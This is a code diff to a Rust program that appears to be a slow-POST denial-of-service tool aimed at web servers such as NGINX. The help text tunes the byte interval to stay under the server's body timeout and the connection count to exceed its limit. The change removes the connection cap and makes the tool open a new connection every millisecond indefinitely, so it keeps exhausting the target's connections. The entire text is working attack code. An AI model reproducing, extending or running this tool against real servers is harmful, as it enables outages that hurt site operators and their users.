@@ -47,10 +47,6 @@ fn main() {
              .value_name("SECONDS")
              .long("interval")
              .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
-        .arg(Arg::with_name("connections-count")
-             .value_name("INTEGER")
-             .long("connections-count")
-             .help("Number of simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
         .get_matches();
 
     let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
@@ -62,7 +58,6 @@ fn main() {
     let path = parsed_url.path();
     let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
     let interval = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
-    let connections_count: usize = value_t!(arguments, "connections-count", usize).unwrap_or(2048);
 
     let mut core = Core::new().unwrap();
     let handle = core.handle();
@@ -76,7 +71,10 @@ fn main() {
 
     let live_connections = Rc::new(RefCell::new(0usize));
     let track_live_connections = live_connections.clone();
-    let cycle = future::loop_fn(0usize, move |connection_number| {
+    let connection_number = Rc::new(RefCell::new(0usize));
+    let cycle = Interval::new_interval(Duration::from_millis(1)).for_each(move |_| {
+        *connection_number.borrow_mut() += 1;
+        let connection_number = *connection_number.borrow();
         let host = host.clone();
         let start = start.clone();
         let tls_connector = tls_connector.clone();
@@ -114,15 +112,10 @@ fn main() {
             *live_connections.borrow_mut() -= 1;
             println!("Connection: {} failed! Reason: {}", connection_number, e);
         }));
-
-        if connection_number < connections_count {
-            Ok(future::Loop::Continue(connection_number + 1))
-        } else {
-            Ok(future::Loop::Break(()))
-        }
+        Ok(())
     });
 
-    loop_handle.spawn(cycle.map_err(move |e: io::Error| println!("Cannot spawn connections cycle loop. Reason: {}", e)));
+    loop_handle.spawn(cycle.map_err(move |e| println!("Cannot spawn connections cycle loop. Reason: {}", e)));
     let print_interval = Duration::from_secs(5);
     loop_handle.spawn(
         Interval::new_interval(print_interval).for_each(move |_| {
